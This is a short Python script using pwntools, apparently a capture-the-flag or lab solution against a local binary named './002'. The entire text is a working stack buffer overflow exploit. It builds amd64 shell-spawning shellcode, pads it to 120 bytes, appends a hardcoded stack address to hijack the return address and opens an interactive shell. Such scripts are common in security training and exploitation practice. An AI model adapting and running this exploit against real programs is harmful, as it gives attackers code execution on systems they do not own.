from pwn import *
context.arch = 'amd64'
io = process("./002")
shellcode = asm(shellcraft.amd64.sh()).ljust(120, b'A')
buf = 0x7fffffffdf70
payload = shellcode + p64(buf)
io.sendline(payload)
io.interactive()
